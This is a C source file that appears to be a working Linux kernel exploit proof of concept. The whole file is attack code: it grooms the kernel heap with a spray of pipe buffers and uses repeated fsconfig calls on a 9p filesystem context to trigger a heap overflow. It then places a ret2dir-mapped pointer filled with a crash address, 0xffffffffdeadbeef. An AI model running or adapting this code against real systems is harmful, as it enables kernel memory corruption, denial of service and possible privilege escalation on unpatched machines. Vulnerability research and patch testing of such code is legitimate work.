#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/resource.h>

#include "libexp.h"

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)


#define SPRAY_NUM 0x80
#define CRASH_ADDR 0xffffffffdeadbeef
char payload[0x1000];
int pipe_fds[SPRAY_NUM][2];
int oob_fd;

void increase_limit()
{
	int ret;
	struct rlimit open_file_limit;

	/* Query current soft/hard value */
	ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
	
	/* Set soft limit to hard limit */
	open_file_limit.rlim_cur = open_file_limit.rlim_max;
	ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
}

void context_setup()
{
	oob_fd = fsopen("9p", 0);
	assert(oob_fd >= 0);
}

void payload_setup()
{
	memset(payload, 'B', 0x10);

	void *addr = umem_alloc(NULL, 0x1000);
	u64 *ptr = (u64 *)addr;
	for(int i=0; i<0x10; i++) ptr[i] = CRASH_ADDR;
	u64 kptr = ret2dir_setup(addr, 0xffff888000000000);
	// printf("kptr: %#llx\n", kptr);

	*(u64 *)&payload[0x10] = kptr+0x10;
}

void exploit()
{
	int ret;

	// heap grooming
	for(int i=0; i<SPRAY_NUM; i++) {
		printf("%d\n", i);
		ret = pipe(pipe_fds[i]);
		assert(ret == 0);
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, 0x34*0x1000);
		assert(ret > 0);
	}
	for(int i=0; i<SPRAY_NUM; i+=8) {
	 	close(pipe_fds[i][1]);
	 }
	for(int i=0; i<SPRAY_NUM; i++) {
		write(pipe_fds[i][1], "A", 1);
	 }

	// place the vulnerable object and overflow
	char val[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	for (int i = 0; i < 117; i++) {
		fsconfig(oob_fd, FSCONFIG_SET_STRING, "\x00", val, 0);
	}
	fsconfig(oob_fd, FSCONFIG_SET_STRING, payload, "\x00", 0);

	// trigger
	for(int i=0; i<SPRAY_NUM; i++) {
		// printf("write: i: %d, ret: %d\n", i, ret);
		read(pipe_fds[i][0], NULL, 1);
		// int var;
		// ioctl(pipe_fds[i][0], FIONREAD, &var);
		// lseek(pipe_fds[i][0], 0, 0);
		// printf("read: i: %d, ret: %d\n", i, ret);
	}
}

int main(void)
{
	setup_sandbox();
	increase_limit();

	context_setup();
	payload_setup();
	exploit();

	puts("Done");
	getchar();
	return 0;
}
